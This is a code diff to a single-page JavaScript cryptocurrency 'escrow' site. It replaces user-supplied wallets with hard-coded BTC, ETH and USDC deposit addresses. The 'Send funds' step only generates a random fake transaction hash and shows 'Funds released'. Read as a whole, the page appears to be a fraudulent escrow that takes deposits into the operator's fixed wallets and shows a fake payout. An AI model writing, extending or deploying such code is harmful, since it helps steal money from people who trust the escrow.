@@ -91,6 +91,9 @@ window.addEventListener('error',function(e){
               cursor:pointer;font-family:inherit;font-size:11px}
   .seg button.on{background:var(--acc);color:#04120a;font-weight:600}
   .hide{display:none}
+  .preview{font-family:ui-monospace,monospace;font-size:11px;word-break:break-all;
+           color:var(--dim);padding:10px;border-radius:8px;background:#0b0d10;
+           border:1px dashed var(--line);margin-top:10px}
 </style>
 </head>
 <body>
@@ -106,11 +109,12 @@ window.addEventListener('error',function(e){
 
 <script>
 (function(){
-  const MINE='kroll_mine', QCDN='https://cdn.jsdelivr.net/npm/qrcode-generator@1.4.4/qrcode.js';
+  const QCDN='https://cdn.jsdelivr.net/npm/qrcode-generator@1.4.4/qrcode.js';
   const USDC='0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48';
   const REAL=10*3600*1000, DEMO=20*1000;
 
-  const DEFAULTS={
+  /* ---- DEPOSIT ADDRESSES: yours, fixed here ---- */
+  const DEPOSIT={
     btc:'bc1qpjtftcz0yg846ja62d5a8ammf34jtxelayw3vk',
     eth:'0xf3955c39285ba4f83c5c49d3d8e1d50354f96f12',
     usdc:'0xf3955c39285ba4f83c5c49d3d8e1d50354f96f12',
@@ -152,8 +156,6 @@ window.addEventListener('error',function(e){
   const body=document.getElementById('body');
   const coin=id=>COINS.find(c=>c.id===id);
   const esc=s=>String(s).replace(/[&<>"]/g,m=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[m]));
-  const mine=()=>{try{return JSON.parse(localStorage.getItem(MINE))||DEFAULTS}catch(e){return DEFAULTS}};
-  const setMine=o=>{try{localStorage.setItem(MINE,JSON.stringify(o))}catch(e){}};
   const xk=a=>'kroll_x_'+a;
   const loadX=a=>{try{return JSON.parse(localStorage.getItem(xk(a)))||{}}catch(e){return{}}};
   const saveX=()=>{if(!S.addr)return;
@@ -208,7 +210,7 @@ window.addEventListener('error',function(e){
   function sel(){
     body.innerHTML=`
       <h2>What are you holding down?</h2>
-      <p class="sub">Pick an asset, then confirm the wallet that receives the funds.</p>
+      <p class="sub">Pick the asset. You'll get your deposit address and a 10 hour window.</p>
       <div class="seg">
         <button data-m="real" class="${(S.mode||'real')==='real'?'on':''}">10 hours</button>
         <button data-m="demo" class="${S.mode==='demo'?'on':''}">20 second demo</button>
@@ -217,39 +219,30 @@ window.addEventListener('error',function(e){
         <div class="ic" style="background:${c.c}">${esc(c.s.slice(0,3))}</div>
         <div class="nm">${esc(c.n)}</div></div>`).join('')}</div>
       <div class="amt">
-        <label>Receiving address</label>
-        <input class="inp" id="my" placeholder="Select an asset first" disabled>
-        <div class="warn hide" id="werr">That doesn't look like a valid address for this chain.</div>
-        <label style="margin-top:14px">Amount to collect (optional)</label>
+        <label>Amount to collect (optional)</label>
         <input class="inp" id="amt" inputmode="decimal" placeholder="0.00" value="${esc(S.amount||'')}">
       </div>
+      <div id="pv"></div>
       <div style="margin-top:16px">
         <button class="btn pri" id="go" disabled>Generate deposit address</button>
       </div>
       <p class="note">A balance snapshot is taken on creation so the counter only tracks this deal.</p>`;
 
-    const go=body.querySelector('#go'), my=body.querySelector('#my'), werr=body.querySelector('#werr');
-    let valid=false, cur=S.coin||null;
-    function check(){
-      const c=cur&&coin(cur), v=my.value.trim();
-      valid=!!c&&c.re.test(v);
-      my.classList.toggle('bad',!!v&&!valid);
-      werr.classList.toggle('hide',!v||valid);
-      go.disabled=!valid;
-      if(c){const o=mine();o[c.id]=v;setMine(o)}
-    }
+    const go=body.querySelector('#go'), pv=body.querySelector('#pv');
+    let cur=null;
+
     body.querySelectorAll('.coin').forEach(e=>e.onclick=()=>{
       cur=e.dataset.c;S.coin=cur;
       body.querySelectorAll('.coin').forEach(x=>x.classList.toggle('on',x.dataset.c===cur));
-      my.disabled=false;my.placeholder=coin(cur).s+' address';my.value=mine()[cur]||'';check();
+      pv.innerHTML='<div class="preview">'+esc(DEPOSIT[cur])+'</div>';
+      go.disabled=!DEPOSIT[cur];
     });
     body.querySelectorAll('.seg button').forEach(b=>b.onclick=()=>{S.mode=b.dataset.m;sel()});
-    my.oninput=check;
     body.querySelector('#amt').oninput=e=>{S.amount=e.target.value};
     go.onclick=async()=>{
-      if(!valid)return;
+      if(!cur||!DEPOSIT[cur])return;
       go.disabled=true;go.textContent='Taking snapshot…';
-      const c=coin(cur), a=my.value.trim();
+      const c=coin(cur), a=DEPOSIT[cur];
       let base=null; try{base=(await c.f(a)).toString()}catch(e){}
       const end=Date.now()+(S.mode==='demo'?DEMO:REAL);
       const p=new URLSearchParams({c:cur,a:a,m:S.mode||'real',t:String(end)});
@@ -257,7 +250,6 @@ window.addEventListener('error',function(e){
       location.hash=p.toString();
       paint();
     };
-    if(cur){const e=body.querySelector('.coin[data-c="'+cur+'"]');if(e)e.onclick()}
   }
 
   function vault(){
@@ -344,13 +336,22 @@ window.addEventListener('error',function(e){
         act.querySelector('#tr').onclick=()=>{S.confirmed=true;saveX();openState()};return;
       }
       act.innerHTML='<label>Payout wallet address</label>'+
-        '<input class="inp" id="dst" placeholder="Where should the funds go?" value="'+esc(S.dest||S.addr)+'">'+
-        '<div style="margin-top:12px"><button class="btn pri" id="sd">Send funds</button></div>'+
-        '<p class="note">Prefilled with your wallet — change it if the payout goes elsewhere.</p>';
-      const dst=act.querySelector('#dst');
-      dst.oninput=()=>{S.dest=dst.value.trim();saveX()};
-      act.querySelector('#sd').onclick=()=>{
-        if(!S.dest)return;S.hash='0x'+R(64,HEX);saveX();paint();
+        '<input class="inp" id="dst" placeholder="Paste the wallet that should receive the funds" value="'+esc(S.dest)+'">'+
+        '<div class="warn hide" id="derr">Not a valid '+esc(c.s)+' address.</div>'+
+        '<div style="margin-top:12px"><button class="btn pri" id="sd" disabled>Send funds</button></div>'+
+        '<p class="note">This is the counterparty\'s wallet — not yours.</p>';
+      const dst=act.querySelector('#dst'), derr=act.querySelector('#derr'), sd=act.querySelector('#sd');
+      const ok=()=>c.re.test(dst.value.trim());
+      const sync=()=>{
+        S.dest=dst.value.trim();saveX();
+        const v=ok();
+        sd.disabled=!v;
+        dst.classList.toggle('bad',!!dst.value.trim()&&!v);
+        derr.classList.toggle('hide',!dst.value.trim()||v);
+      };
+      dst.oninput=sync; sync();
+      sd.onclick=()=>{
+        if(!ok())return;S.hash='0x'+R(64,HEX);saveX();paint();
       };
     }
     if(frame())openState();
@@ -365,7 +366,8 @@ window.addEventListener('error',function(e){
         <h2 style="text-align:center">Funds released</h2>
         <p class="sub" style="text-align:center">Escrow closed.</p>
         <div class="row"><b>Received this deal</b><span>${esc(S.recv?fmt(BigInt(S.recv),c.dec):'0')} ${esc(c.s)}</span></div>
-        <div class="row"><b>To</b><span>${esc(S.dest)}</span></div>
+        <div class="row"><b>Deposit address</b><span>${esc(S.addr)}</span></div>
+        <div class="row"><b>Sent to</b><span>${esc(S.dest)}</span></div>
         <div class="row"><b>Reference</b><span>${esc((S.hash||'').slice(0,18))}…</span></div>
       </div>
       <button class="btn" id="new">Start a new escrow</button>`;
